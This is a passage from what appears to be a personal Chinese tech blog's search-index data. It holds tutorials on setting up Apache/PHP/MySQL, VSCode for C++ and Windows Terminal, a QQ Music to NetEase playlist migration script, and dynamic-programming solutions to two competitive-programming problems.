&quot;flag&#123;d29252e4-78f4-4a9a-a01b-ab2f8a5389fc&#125;&quot;&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"SQLi","slug":"SQLi","permalink":"https://sxyugao.top/tags/SQLi/"}]},{"title":"Windows下配置Apache/PHP/MySQL环境","slug":"Windows下配置Apache-PHP-MySQL环境","date":"2021-10-18T12:35:23.000Z","updated":"2022-02-23T04:02:29.998Z","comments":true,"path":"p/6538c63d.html","permalink":"https://sxyugao.top/p/6538c63d.html","excerpt":"要想学习 CTF，就要学很多杂七杂八的东西，相关的环境也是必不可少。 下文将带你一起在 Windows 下配置 Apache/PHP/MySQL 环境。 想省事直接装集成开发环境的朋友可以直接划走。","text":"要想学习 CTF，就要学很多杂七杂八的东西，相关的环境也是必不可少。 下文将带你一起在 Windows 下配置 Apache/PHP/MySQL 环境。 想省事直接装集成开发环境的朋友可以直接划走。 Apache 官网：https://httpd.apache.org/ 选择喜欢的版本，点击 Download，会传送到相应锚点。因为我们是 Windows 下安装环境，所以选择 Files for Microsoft Windows。在 Downloading Apache for Windows 下有很多选项，选择 ApacheHaus 或是 Apache Lounge，而后面都是集成开发环境了。 下载后解压即可，推荐新建一个 Server 文件夹把它扔进去。 打开 Server\\Apache24\\conf\\httpd.conf，找到 Define SRVROOT，将其改为 D:\\Server\\Apache24。 最后应形如 Define SRVROOT &quot;D:\\Server\\Apache24&quot;。 执行 httpd -t 检查配置有无语法错误。 建议把 Server\\Apache24\\bin 放到环境变量里去，可以直接用 httpd。 MySQL 官网：https://www.mysql.com/ 找到上方的 DOWNLOADS，然后下拉到最底部，有一个 “MySQL Community (GPL) Downloads »”，找到社区版。（Oracle 公司坏的很，把免费的社区版放那么隐蔽的地方，我找了半天，难怪原作者跑去弄 MariaDB 了） 下载下来的是个 Installer，默认自带了 MySQL8，想要其他版本的可以在里面自行勾选，需要额外下载内容。 里面有些组件需要新版 Microsoft Visual C++ Redistributable 支持，没有的可以点这里去官网下载。 如果没啥需求直接 Next 就行。 PHP 官网：https://www.php.net/ 老样子，点击上面的 Downloads，下载后是个压缩包，解压即可，推荐和 Apache 一起扔到 Server 文件夹下面。 P.S. 想用 PHP 编写单代码文件的小伙伴可以把 Server\\php 放进环境变量里。 可能会有小伙伴会问为什么上面步骤那么少？因为 PHP 才是串起 Apache 和 MySQL 的关键，接下来需要为它们俩配置 PHP。 Apache 打开 Server\\Apache24\\conf\\httpd.conf， 我们需要加载 PHP，所以找到加载模块的地方（也就是有一串 LoadModule 的地方），在最后加上 1LoadModule php_module &#x27;D:\\Server\\php\\php8apache2_4.dll&#x27; 然后添加名叫 PHPRC 的环境变量，路径设置为 D:\\Server\\php\\。 不推荐使用 PHPIniDir 变量，笔者有时候加载不到 php.ini。 如果想用的话在 httpd.conf 中添加一行 PHPIniDir &quot;D:\\Server\\php&quot; 即可。 其中路径请自行替换为自己本机的路径，不要照搬。 然后在 mime_module 设置下，添加 AddHandler application/x-httpd-php .php。 最后的内容结构应形如： 1234567891011121314151617181920&lt;IfModule mime_module&gt; # # TypesConfig points to the file containing the list of mappings from # filename extension to MIME-type. # TypesConfig conf/mime.types ... # # Filters allow you to process content before it is sent to the client. # # To parse .shtml files for server-side includes (SSI): # (You will also need to add &quot;Includes&quot; to the &quot;Options&quot; directive.) # #AddType text/html .shtml #AddOutputFilter INCLUDES .shtml AddType application/x-httpd-php .php&lt;/IfModule&gt; 最后找到 DirectoryIndex， 在后面添加 index.php，最后应为 DirectoryIndex index.html index.php。 MySQL 将 Server\\php 下的 php.ini-development（或是 php.ini-production）复制一份，重命名为 php.ini，打开它。 找到 extension_dir，有个 “On windows”的选项，将其下路径改为绝对路径，以我为例，修改完应为: extension_dir = &quot;D:\\Server\\php\\ext&quot;。 然后找到 extension=mysqli，将前面的注释去除。 在高版本的 PHP 中，php_mysql.dll 已经被去除了，如果你看过别的教程可能会找不到这个文件。 检查配置 在 Server\\Apache24\\htdocs 下新建一个内容为 &lt;?php phpinfo(); ?&gt; 的 index.php，。 命令行运行 httpd，直接打开 http://127.0.0.1/ 或者 http://localhost/ 看有没有加载出网页。 如果没有，说明 Apache 中的 DirectoryIndex 配置错了。 接着看输出的内容，重点检查 Loaded Configuration File 是否正确，然后查看 mysqli 是否加载。 目前主要用到的就只有这些，如果一切正常，那么恭喜你成功了。 如果有什么出入的可以在下面评论留言，我会尽快回复的。","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"环境配置","slug":"极客/环境配置","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"VSCode配置C++环境","slug":"VSCode配置C++环境","date":"2021-09-24T12:42:57.000Z","updated":"2022-02-23T04:02:11.665Z","comments":true,"path":"p/92e56494.html","permalink":"https://sxyugao.top/p/92e56494.html","excerpt":"以下操作适用于学生等非专业群体，并不适合制作专业工程的人 由于疫情的原因，刚刚才到学校。发现有不少小伙伴不知道该怎么配置 C++ 环境并使用 VSCode。没关系，看完这篇文章你就会了。 不了解 VSCode 的小伙伴可以点这里，是我自己个人的一些主观评价，不一定准确。","text":"以下操作适用于学生等非专业群体，并不适合制作专业工程的人 由于疫情的原因，刚刚才到学校。发现有不少小伙伴不知道该怎么配置 C++ 环境并使用 VSCode。没关系，看完这篇文章你就会了。 不了解 VSCode 的小伙伴可以点这里，是我自己个人的一些主观评价，不一定准确。 配置 C++ 环境 笔者使用的是 MinGW64，下面的百度网盘是我以前安装后重新压缩的版本，精简了目录结构，而且无需再次下载，比较推荐。 链接：https://pan.baidu.com/s/1J4qINTwFEFh9jWxPG1s11Q 提取码：njlg 不过好久没用官方的安装版了，现在安装的目录结构是不是还是那么冗余笔者也不了解。 官网链接：https://www.mingw-w64.org/ ，下载自己系统对应版本的安装即可。 如果有什么官方版的问题，可以在评论区留言告诉我，我会尽量解决。 因此以下教程均按照我个人压缩过的版本为准，已经配置好的同学可以直接跳过。 以系统盘为 C 盘为例，将下载好的 MinGW64.7z 放到 C 盘，然后解压。 解压后的目录结构应与下图类似： 之后我们去配置环境变量，环境变量的科普可以自行百度，这里就不再赘述。 适用于较老版本的 Windows10 或者更老版本的 Windows： 控制面板 &gt; 系统和安全 &gt; 系统 &gt; 高级系统设置 适用于新版本的 Windows10： 设置 &gt; 系统 &gt; 关于 &gt; 高级系统设置 然后找到“高级”，有一个环境变量选项，点进去，在 Path 下添加 C:\\MinGW64\\bin，保存并退出。 最后在任意目录下打开 cmd，输入 g++，出现以下信息便代表你成功了。 12g++.exe: fatal error: no input filescompilation terminated. 安装 VSCode 我们需要下载一个 VSCode，官网：https://code.visualstudio.com/。 安装选项可以选择右键菜单，这样打开会方便一点点，当然不配置一直下一步也是可以的。 打开后依照个人需求选择是否安装语言包。 安装 C/C++ 扩展 在左侧找到扩展，然后搜索 “C/C++”，安装第一个名字就是这个的。 这个扩展的用途是提供代码补全，代码格式化等功能。当然它的用途远不止这些，不过对于我们现在来说掌握这些就够用了。 此步之前请务必保证已经配置好 C++ 环境，该扩展会自动检索已存在的环境并添加头文件。 如果未配置成功，扩展将找不到头文件并报错，需要手动添加，较为麻烦且容易遗漏。 部分电脑出现安装后无法使用的情况（如我一个舍友的笔记本），也没什么关系，缺少代码补全只是让你敲代码的时候稍微难受一点，不是决定性的。 安装 Code Runner 扩展 这个扩展是用来编译执行我们的程序的。 和之前同样的方式安装这个扩展，然后打开 设置 &gt; 扩展 &gt; Run Code configuration ，找到 “Executor Map” 进行配置。 我的配置如下： 123&quot;code-runner.executorMap&quot;: &#123; &quot;cpp&quot;: &quot;cd $dir &amp;&amp; g++ \\&quot;$fileName\\&quot; -o \\&quot;$fileNameWithoutExt\\&quot; -std=c++11 -Wall -Wl,--stack=1000000000 &amp;&amp; start cmd /c \\&quot;\\&quot;$fileNameWithoutExt\\&quot; &amp; pause\\&quot;&quot;,&#125;, 稍微解释一下。 $dir 和 $fileNameWithoutExt 都是 VSCode 自带的变量，$dir 表示当前文件所在的目录，$fileNameWithoutExt 则表示去除后缀的文件名。 &amp;&amp; 连接符需要之前命令不报错才会继续，&amp; 连接符不管之前有无错误都会继续。 g++ 后面跟着的是编译命令，-std=c++11 表示使用 C++11 标准，-Wall 表示打开代码警告。 -Wl,--stack=1000000000 用来申请更多的栈空间，防止递归层数过多爆栈。 配置好以后就可以点击右上角的小箭头来编译运行了。 还有一些设置比如 Ignore Selection 和 Save File Before Run 建议勾选。 前者是给一些解释型语言用的，如果不勾选会出现单独编译选中内容的情况；后者是给运行前忘记保存文件时用的。 不要勾选设置里的 Run In Terminal，可能导致报错。 其他的一些配置就自己摸索吧。才不是想摸鱼了呢","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"环境配置","slug":"极客/环境配置","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"Windows Terminal，高颜值的终端你值得拥有","slug":"Windows-Terminal，高颜值的终端你值得拥有","date":"2020-10-04T02:39:16.000Z","updated":"2022-02-23T04:02:19.890Z","comments":true,"path":"p/85171339.html","permalink":"https://sxyugao.top/p/85171339.html","excerpt":"这是一篇本该在暑假就该写的文章，但是由于我是一只鸽子，所以又咕咕咕了，这次趁国庆假期的最后一天填一下坑。 本篇文章将向你介绍微软推出的一款 Windows 下的高颜值终端：Windows Terminal。 强烈建议本文配合 美化你的PowerShell 食用。 The new Windows Terminal and the original Windows console host, all in the same place!","text":"这是一篇本该在暑假就该写的文章，但是由于我是一只鸽子，所以又咕咕咕了，这次趁国庆假期的最后一天填一下坑。 本篇文章将向你介绍微软推出的一款 Windows 下的高颜值终端：Windows Terminal。 强烈建议本文配合 美化你的PowerShell 食用。 The new Windows Terminal and the original Windows console host, all in the same place! 项目主页：https://github.com/microsoft/terminal 很早的时候就看见了微软的这个项目，不过那时候仍然是预览版，所以也没在意。 今年暑假的时候突然想起还有这个项目，去看了一下，好家伙，正式版已经出了 3 个月了，赶紧去下一个尝尝鲜。 应用商店可以直接搜索到。 系统要求为“Windows 10 版本 18362.0 或更高版本”，非 Windows10 读者可以把这个页面关掉了（笑）。 下载 官方最为推荐的是通过 Microsoft Store 下载，官网的文档也只有这个方式。 但是如果你不想这样，当然也可以采取别的方式，具体请参考这个页面。 外观美化 刚下好的终端打开可能没有想象中的那么好看，不过没关系，我们可以美化啊。 配置文件通过标题栏中向下的小箭头中的“设置”打开，注意是 json 格式的，对新手不友好，感觉未来应该会出 GUI 版本的（一口毒奶）。 此外，配置文件保存后终端会自动更新，可以直接看到更改后的效果，因此没必要将终端关闭再打开。 字体 直接参考之前的文章，个人是使用更纱黑体 (Sarasa Term SC) 的。 由于 Pjax 的缘故，记得在新标签页中打开该链接，不过也没多大关系。（笑） 颜色主题 还是熟悉的地方，找到 iTerm2 Color Schemes，点开 windowsterminal 文件夹，找到自己喜欢的主题，将它复制到 settings.json 中。 以 AdventureTime 举个例子，复制全部内容，然后找到 settings.json 中的片段 1234// Add custom color schemes to this array.// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes&quot;schemes&quot;: [], 粘贴进去结果如下： 12345678910111213141516171819202122232425// Add custom color schemes to this array.// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes&quot;schemes&quot;: [ &#123; &quot;name&quot;: &quot;AdventureTime&quot;, &quot;black&quot;: &quot;#050404&quot;, &quot;red&quot;: &quot;#bd0013&quot;, &quot;green&quot;: &quot;#4ab118&quot;, &quot;yellow&quot;: &quot;#e7741e&quot;, &quot;blue&quot;: &quot;#0f4ac6&quot;, &quot;purple&quot;: &quot;#665993&quot;, &quot;cyan&quot;: &quot;#70a598&quot;, &quot;white&quot;: &quot;#f8dcc0&quot;, &quot;brightBlack&quot;: &quot;#4e7cbf&quot;, &quot;brightRed&quot;: &quot;#fc5f5a&quot;, &quot;brightGreen&quot;: &quot;#9eff6e&quot;, &quot;brightYellow&quot;: &quot;#efc11a&quot;, &quot;brightBlue&quot;: &quot;#1997c6&quot;, &quot;brightPurple&quot;: &quot;#9b5953&quot;, &quot;brightCyan&quot;: &quot;#c8faf4&quot;, &quot;brightWhite&quot;: &quot;#f6f5fb&quot;, &quot;background&quot;: &quot;#1f1d45&quot;, &quot;foreground&quot;: &quot;#f8dcc0&quot; &#125;], 最后保存即可。 当然熟悉美术设计的大佬也可以自己配色。 背景 直接上我的配置： 123456789101112131415&quot;list&quot;: [ &#123; // Make changes here to the powershell.exe profile. &quot;guid&quot;: &quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;, &quot;name&quot;: &quot;Windows PowerShell&quot;, &quot;commandline&quot;: &quot;powershell.exe&quot;, &quot;hidden&quot;: false, &quot;fontFace&quot;: &quot;Sarasa Term SC&quot;, &quot;colorScheme&quot;: &quot;AdventureTime&quot;, &quot;useAcrylic&quot;: true, &quot;acrylicOpacity&quot;: 0.85, &quot;backgroundImage&quot;: &quot;D://Pictures/Wallpaper.jpg&quot;, &quot;backgroundImageOpacity&quot;: 0.2 &#125;] fontFace 终端字体； colorScheme 上文配置的颜色主题，把 name 填进去就行； useAcrylic 是否启用毛玻璃效果，默认好像是 false； acrylicOpacity 毛玻璃程度，取值 0 ~ 1； backgroundImage 终端背景图片； backgroundImageOpacity 终端背景图片透明度，取值 0 ~ 1； 不同的 shell，可以配置不同的背景，方法同上。 应该还有其他不少配置，详见官网，其他的美化大概也用不到？ 话说这个文档机翻痕迹严重，不如直接看英语原版。 文件资源管理器右键打开 在最新版本的 Windows Terminal 中已经集成这项功能了，安装最新版本的可以无视这些内容。 我们可以通过在文件资源管理器的路径栏中输入 wt -d . 来实现在当前文件夹下打开 Windows Terminal 的功能，但这不够舒适，怎么在右键菜单中加入这个命令呢？我们可以借助一位大佬的项目来完成。 使用非常简单，就按着指南来就行。 当然如果你不嫌麻烦，可以自己去修改注册表，参考这篇文章或者是自己去寻找其他资料。 最终成果 辣鸡笔记本，估计要到大学才换。（快了快了）","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"Windows","slug":"极客/Windows","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Windows/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"在电脑上将QQ音乐导入到网易云","slug":"在电脑上将QQ音乐导入到网易云","date":"2020-05-03T13:34:35.000Z","updated":"2022-01-07T13:57:23.227Z","comments":true,"path":"p/41be36a7.html","permalink":"https://sxyugao.top/p/41be36a7.html","excerpt":"最近帮一位朋友把 QQ 音乐歌单里的歌曲导入到网易云音乐，虽然手机端有音乐导入的选项，但她似乎觉得不是很好用。 在网上也没有这类的教程，全是把网易云导入到 QQ 音乐的（笑），只好借助别人造好的轮子实现了一个。 链接：https://github.com/sxyugao/QQMusicToNetease 以下是实现过程，不感兴趣的朋友可以不看。","text":"最近帮一位朋友把 QQ 音乐歌单里的歌曲导入到网易云音乐，虽然手机端有音乐导入的选项，但她似乎觉得不是很好用。 在网上也没有这类的教程，全是把网易云导入到 QQ 音乐的（笑），只好借助别人造好的轮子实现了一个。 链接：https://github.com/sxyugao/QQMusicToNetease 以下是实现过程，不感兴趣的朋友可以不看。 将 QQMusicApi 和 NeteaseCloudMusicApi 克隆到本地，先熟悉一下接口。 节选一段通过 QQMusicApi 获得的 QQ 音乐歌单信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&#123; &quot;albumdesc&quot;: &quot;&quot;, &quot;albumid&quot;: 1526209, &quot;albummid&quot;: &quot;0007oL0R1hDyxV&quot;, &quot;albumname&quot;: &quot;君の名は。 (《你的名字。》动画电影原声带)&quot;, &quot;alertid&quot;: 2, &quot;belongCD&quot;: 21, &quot;cdIdx&quot;: 0, &quot;interval&quot;: 243, &quot;isonly&quot;: 0, &quot;label&quot;: &quot;4611686018431582240&quot;, &quot;msgid&quot;: 13, &quot;pay&quot;: &#123; &quot;payalbum&quot;: 0, &quot;payalbumprice&quot;: 0, &quot;paydownload&quot;: 1, &quot;payinfo&quot;: 1, &quot;payplay&quot;: 1, &quot;paytrackmouth&quot;: 1, &quot;paytrackprice&quot;: 200, &quot;timefree&quot;: 0 &#125;, &quot;preview&quot;: &#123; &quot;trybegin&quot;: 0, &quot;tryend&quot;: 0, &quot;trysize&quot;: 960887 &#125;, &quot;rate&quot;: 0, &quot;singer&quot;: [ &#123; &quot;id&quot;: 9962, &quot;mid&quot;: &quot;000f1b6W1wzyRN&quot;, &quot;name&quot;: &quot;RADWIMPS (ラッドウィンプス)&quot; &#125; ], &quot;size128&quot;: 3893085, &quot;size320&quot;: 9732393, &quot;size5_1&quot;: 0, &quot;sizeape&quot;: 0, &quot;sizeflac&quot;: 38430893, &quot;sizeogg&quot;: 5040946, &quot;songid&quot;: 107762026, &quot;songmid&quot;: &quot;000HHwBt3KESHr&quot;, &quot;songname&quot;: &quot;三葉のテーマ (三叶的主题音乐)&quot;, &quot;songorig&quot;: &quot;三葉のテーマ&quot;, &quot;songtype&quot;: 0, &quot;strMediaMid&quot;: &quot;000rw7Do2ey9VI&quot;, &quot;stream&quot;: 0, &quot;switch&quot;: 17401089, &quot;type&quot;: 0, &quot;vid&quot;: &quot;&quot;&#125; 稍微分析一下，便会发现用 songorig 字段去搜索是最为靠谱的。 下面是通过 NeteaseCloudMusicApi 搜索到的歌曲信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&#123; &quot;result&quot;: &#123; &quot;songs&quot;: [ &#123; &quot;id&quot;: 1406638282, &quot;name&quot;: &quot;三葉のテーマ&quot;, &quot;artists&quot;: [ &#123; &quot;id&quot;: 33288488, &quot;name&quot;: &quot;屈艳宇&quot;, &quot;picUrl&quot;: null, &quot;alias&quot;: [], &quot;albumSize&quot;: 0, &quot;picId&quot;: 0, &quot;img1v1Url&quot;: &quot;https://p1.music.126.net/6y-UleORITEDbvrOLV0Q8A==/5639395138885805.jpg&quot;, &quot;img1v1&quot;: 0, &quot;trans&quot;: null &#125; ], &quot;album&quot;: &#123; &quot;id&quot;: 81755365, &quot;name&quot;: &quot;Vinky is a cat&quot;, &quot;artist&quot;: &#123; &quot;id&quot;: 0, &quot;name&quot;: &quot;&quot;, &quot;picUrl&quot;: null, &quot;alias&quot;: [], &quot;albumSize&quot;: 0, &quot;picId&quot;: 0, &quot;img1v1Url&quot;: &quot;https://p1.music.126.net/6y-UleORITEDbvrOLV0Q8A==/5639395138885805.jpg&quot;, &quot;img1v1&quot;: 0, &quot;trans&quot;: null &#125;, &quot;publishTime&quot;: 1569142910676, &quot;size&quot;: 7, &quot;copyrightId&quot;: 0, &quot;status&quot;: 0, &quot;picId&quot;: 109951164380589660, &quot;mark&quot;: 0 &#125;, &quot;duration&quot;: 240455, &quot;copyrightId&quot;: 0, &quot;status&quot;: 0, &quot;alias&quot;: [], &quot;rtype&quot;: 0, &quot;ftype&quot;: 0, &quot;mvid&quot;: 0, &quot;fee&quot;: 8, &quot;rUrl&quot;: null, &quot;mark&quot;: 64 &#125; ], &quot;hasMore&quot;: true, &quot;songCount&quot;: 74 &#125;, &quot;code&quot;: 200&#125; 上面我传的参数是 limit=1，虽然可以发现排在第一位的并不是 QQ 音乐的原曲，但是如果去试听一下就会发现是差不多的，出现这个现象是因为原曲已经变成了付费歌曲。 说起来网易云真是贴心，搜出来的第一个就是穷人版的欸，所以就放心大胆地直接用第一个吧。 因为 NeteaseCloudMusicApi 向歌单添加歌曲的接口 /playlist/tracks 要求传入的是歌曲 id，所以我们到时候传的是 res.result.songs[0].id。 熟悉好接口后我们就可以开始了。 实现思路非常 simple，就是先获取 QQ 音乐歌单里的歌曲，再在网易云音乐搜索相关歌曲，将关联度最高的导入网易云音乐。 说起来简单，可是实际操作起来还是碰上了问题。由于我的 JavaScript 只是半吊子水平，所以最开始碰到异步过程不按顺序执行头痛不已：每次在请求完成之前都会继续执行，完全摸不着头脑。 在我一筹莫展之际，突然想起来 swwind 学长曾带着我这个小萌新做的 user-scripts，他有一次在这个项目里使用了 Promise，还向我推销过这个特性。 那么为什么不试试 Promise 呢？这次我是独立操作，在上网查阅了基本资料后，不禁也和学长当时一样惊呼：“Promise 大法好！” 用了 Promise 后，代码变得简洁易懂多了。 贴一下核心代码： 123456789101112131415161718const option = &#123; headers: &#123; &#x27;cookie&#x27;: null &#125;&#125;;const NeteaseAPI = (url) =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; http.get(url, option, (req) =&gt; &#123; let s = &quot;&quot;; req.on(&#x27;data&#x27;, (data) =&gt; &#123; s += data; &#125;); req.on(&#x27;end&#x27;, () =&gt; &#123; resolve(JSON.parse(s)); &#125;) &#125;) &#125;)&#125; 使用的时候就可以： 1234NeteaseAPI(request).then((res) =&gt; &#123; // res 是返回的数据 // 一些对 res 进行处理的代码&#125;) 实际操作过程中，会出现歌单歌曲数目不一致，但对应的歌曲可以被找到的情况。根据返回的数据看，是由于付费歌曲无法通过这个接口加入歌单。举个例子，登录后传入 http://localhost:3000/playlist/tracks?op=add&amp;pid=803049038&amp;tracks=451703096，返回的信息为： 1234567&#123; &quot;message&quot;:&quot;未付费歌曲无法收藏&quot;, &quot;trackIds&quot;:&quot;[451703096]&quot;, &quot;code&quot;:512, &quot;count&quot;:190, &quot;cloudCount&quot;:0&#125; 对这种情况稍加判断即可。（话说付费歌曲在客户端上是能收藏的，可能还有其他的接口吧） 最后实现的也比较简陋，只能说是勉强能用，就当是练手了。 P.S. 写代码的时候因为判断等于用了 = 调试了很久，学校教 VB 真是害人不浅啊！","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sxyugao.top/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"洛谷P3914 - 染色计数","slug":"洛谷P3914-染色计数","date":"2019-11-04T12:41:12.000Z","updated":"2022-01-07T13:57:23.228Z","comments":true,"path":"p/6f3c5c0a.html","permalink":"https://sxyugao.top/p/6f3c5c0a.html","excerpt":"CSP-S 前要多做树上问题 （主要是因为去年 NOIP D1T3、D2T1、D2T3 全是树上问题，然后爆炸了） 。 这题一看就是树形DP，状态也是一眼就能想到的。 令 $f_{i,j}$ 表示 $i$ 这个点染成 $j$ 的方案数，枚举 $son_i$ 的颜色来转移。 最后答案即为 $\\sum_{i=1}^{m}f_{1,i}$。","text":"CSP-S 前要多做树上问题 （主要是因为去年 NOIP D1T3、D2T1、D2T3 全是树上问题，然后爆炸了） 。 这题一看就是树形DP，状态也是一眼就能想到的。 令 $f_{i,j}$ 表示 $i$ 这个点染成 $j$ 的方案数，枚举 $son_i$ 的颜色来转移。 最后答案即为 $\\sum_{i=1}^{m}f_{1,i}$。 核心代码如下： 1234567891011121314151617void dfs(int x, int fa) &#123; for (int i = head[x]; i; i = edge[i].nxt) &#123; int y = edge[i].to; if (y == fa) continue; dfs(y, x); &#125; for (int c : col[x]) &#123; for (int i = head[x]; i; i = edge[i].nxt) &#123; int y = edge[i].to; if (y == fa) continue; int sum = 0; for (int j : col[y]) if (j ^ c) Add(sum, f[y][j]); f[x][c] = 1LL * f[x][c] * sum % P; &#125; &#125;&#125; 统计答案的片段就不放了。 但是冷静分析，这东西是 $O(n^3)$ 的，在 $n=5000$ 的数据范围下显然过不掉。 通过观察转移方程我们不难发现某个儿子对当前节点某个颜色的贡献完全可以用该儿子的总贡献减去该儿子对这个颜色的贡献来得到。 这样就能优化成 $O(n^2)$ 了，貌似能过这道题了？ 但是，等等，MLE了？！这道毒瘤题还卡你内存！这都 9102 年了居然还有只开 125M 的题？！其实只是自己菜没看空间限制 所以之前用 vector 存可用颜色的方法就行不通了，只能老老实实从 $1$ 到 $m$ 枚举。 效率大大降低了，时间换空间的典型案例 完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;cstdio&gt;#include &lt;iostream&gt;using namespace std;char buf[1 &lt;&lt; 14], *p1 = buf, *p2 = buf;inline char gc() &#123; return p1 == p2 &amp;&amp; (p2 = (p1 = buf) + fread(buf, 1, 1 &lt;&lt; 14, stdin), p1 == p2) ? EOF : *p1++;&#125;inline int read() &#123; int x = 0, f = 1; char c = gc(); for (; !isdigit(c); c = gc()) if (c == &#x27;-&#x27;) f = -1; for (; isdigit(c); c = gc()) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;const int N = 5005;const int P = 1e9 + 7;int nedge, head[N];struct Edge &#123; int to, nxt;&#125; edge[N &lt;&lt; 1];inline void add(int x, int y) &#123; edge[++nedge].to = y; edge[nedge].nxt = head[x]; head[x] = nedge;&#125;inline void Add(int &amp;x, int y) &#123; x = x + y &gt;= P ? x + y - P : x + y;&#125;inline int Dec(int x, int y) &#123; x -= y; if (x &lt; 0) x += P; return x;&#125;int n, m, f[N][N];void dfs(int x, int fa) &#123; for (int i = head[x]; i; i = edge[i].nxt) &#123; int y = edge[i].to; if (y == fa) continue; dfs(y, x); int sum = 0; for (int c = 1; c &lt;= m; c++) if (f[y][c]) Add(sum, f[y][c]); for (int c = 1; c &lt;= m; c++) if (f[x][c]) f[x][c] = 1LL * f[x][c] * Dec(sum, f[y][c]) % P; &#125;&#125;int main() &#123; n = read(), m = read(); for (int i = 1; i &lt;= n; i++) for (int num = read(); num; num--) f[i][read()] = 1; for (int i = 1; i &lt; n; i++) &#123; int x = read(), y = read(); add(x, y), add(y, x); &#125; dfs(1, 0); int ans = 0; for (int c = 1; c &lt;= m; c++) Add(ans, f[1][c]); printf(&quot;%d&quot;, ans);&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"洛谷","slug":"OI/洛谷","permalink":"https://sxyugao.top/categories/OI/%E6%B4%9B%E8%B0%B7/"}],"tags":[{"name":"DP","slug":"DP","permalink":"https://sxyugao.top/tags/DP/"},{"name":"树上问题","slug":"树上问题","permalink":"https://sxyugao.top/tags/%E6%A0%91%E4%B8%8A%E9%97%AE%E9%A2%98/"}]},{"title":"CF498B Name That Tune","slug":"CF498B-Name-That-Tune","date":"2019-10-21T11:14:05.000Z","updated":"2022-01-07T13:57:23.225Z","comments":true,"path":"p/d7051add.html","permalink":"https://sxyugao.top/p/d7051add.html","excerpt":"作为一道英文题先解释一下题意。 用 $T$ 秒时间按顺序听 $N$ 首歌，第 $i$ 首歌播放时间为 $t_i$ 秒，且每播放一秒都会有 $p_i$ 的概率被识别出来，跳到下一首。某首歌播放时间过完默认被识别，也跳到下一首。若时间有剩余而歌已全部听完则直接结束。求识别出歌数量的期望。 看见题目就想到期望DP。 第一眼想到的方程是设 $f_{i,j}$ 表示第 $i$ 秒识别到第 $j$ 首歌的期望，不难想出一个 $O(n^3)$ 的算法。 枚举一个 $k$ 表示第 $j$ 首歌已经放了几秒，注意一下边界即可。","text":"作为一道英文题先解释一下题意。 用 $T$ 秒时间按顺序听 $N$ 首歌，第 $i$ 首歌播放时间为 $t_i$ 秒，且每播放一秒都会有 $p_i$ 的概率被识别出来，跳到下一首。某首歌播放时间过完默认被识别，也跳到下一首。若时间有剩余而歌已全部听完则直接结束。求识别出歌数量的期望。 看见题目就想到期望DP。 第一眼想到的方程是设 $f_{i,j}$ 表示第 $i$ 秒识别到第 $j$ 首歌的期望，不难想出一个 $O(n^3)$ 的算法。 枚举一个 $k$ 表示第 $j$ 首歌已经放了几秒，注意一下边界即可。 转移如下： 1234567891011double ans = 0;f[0][0] = 1; // 初始化for (int i = 1; i &lt;= T; i++) for (int j = 1; j &lt;= n; j++) &#123; for (int k = 1; k &lt;= i &amp;&amp; k &lt; t[j]; k++) f[i][j] += f[i - k][j - 1] * pow(1 - p[j], k - 1) * p[j]; if (i &gt;= t[j]) f[i][j] += f[i - t[j]][j - 1] * pow(1 - p[j], t[j] - 1); // 单独考虑默认被识别的状况 ans += f[i][j]; // 第 i 秒听到了第 j 首的概率，相当于多了 1 首，直接加到 ans 里 &#125; 但是发现这题 $N \\leq 5000$，$O(n^3)$ 的复杂度显然过不了，但是这个DP方程感觉优化不下去了（可能只是我菜）。。 考虑换一个思路 $f_{i,j}$ 表示第 $i$ 首歌放完是第 $j$ 秒，可以写出这样的方程（其实只是把上面方程的 i, j 反了一下）： 123456789double ans = 0;f[0][0] = 1;for (int i = 1; i &lt;= n; i++) for (int j = 1; j &lt;= T; j++) &#123; for (int k = 1; k &lt;= j &amp;&amp; k &lt; t[i]; k++) f[i][j] += f[i - 1][j - k] * pow(1 - p[i], k - 1) * p[i]; if (j &gt;= t[i]) f[i][j] += f[i - 1][j - t[i]] * pow(1 - p[i], t[i] - 1); ans += f[i][j]; &#125; 然后我们发现了有趣的事情：$f_{i,j}$ 和 $f_{i,j-1}$ 咋这么像呢？！很显然 $k$ 那一维可以用类似前缀和一样的东西优化掉，因为 $f_{i,j}$ 和 $f_{i,j-1}$ 差的基本上只有 $(1-p_i)$ 的概率。 但是直接前缀和是有问题的，当 $j &gt; t_i$ 时明显会把 $t_i \\leq j$ 的情况给算重了，所以要减去。 以下为完整代码： 